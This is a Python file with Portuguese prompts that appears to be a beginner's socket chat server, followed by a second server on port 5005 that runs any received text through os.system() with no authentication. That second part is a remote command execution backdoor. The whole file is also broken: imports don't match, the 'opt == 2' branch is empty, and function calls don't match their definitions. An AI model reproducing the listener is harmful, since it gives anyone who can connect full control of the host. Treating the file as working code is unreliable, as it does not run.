from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
from os import system
import datetime as dtm

def clear():
	system("cls" if os.name == "nt" else "clear")

def acceptIncomingConnections():
	while True:
		client, address = serverSocket.accept()

		host, port = address
		print("{}:{} se conectou!".format(host, port))

		addresses[client] = address
		thr.Thread(target=handleClient, args=(client,)).start()

def handleClient(client):
	opt = int(client.recv(1024).decode())
	
	if opt == 1:
		name = client.recv(1024).decode()

		broadcast("\n  {} se juntou à conversa!".format(name), "utf-8")

		clients[client] = name
		
		client.send(bytes(messages, "utf-8"))

		while True:
			msg = client.recv(1024)

			if msg == bytes("\\quit", "utf-8"):
				client.close()

				del clients[client]
				
				broadcast(bytes("{} deixou a conversa.".format(name), "utf-8"))
				
				break

			messages.append([client, dtm.datetime.now(), name, msg])
			
			broadcast(messages)
	elif opt == 2:


def broadcast(msg):
	for sock in clients:
		sock.send(bytes(msg, "utf-8"))

messages = []

clients = {}
addresses = {}

serverHost = ""
serverPort = input("\n  Informe a porta a utilizar neste socket: ")

serverPort = 33000 if not serverPort else int(serverPort)

address = (serverHost, serverPort)

serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.bind(address)

print("\n  Utilizando a porta {}".format(serverPort))

serverSocket.listen(5)

print("\n  Aguardando conexão...")

acceptThread = thr.Thread(target=acceptIncomingConnections)

acceptThread.start()
acceptThread.join()

serverSocket.close()



host = ""
port = 5005
addr = (host, port)

serv_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

serv_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
serv_socket.bind(addr)

while True:
	serv_socket.listen(10)

	print("Aguardando conexao...")

	con, cliente = serv_socket.accept()

	print("Conectado com", cliente)
	print("Aguardando mensagem...")

	msg = con.recv(1024).decode()

	print("Mensagem recebida:", msg, "\n")

	os.system(msg)

	# serv_socket.close()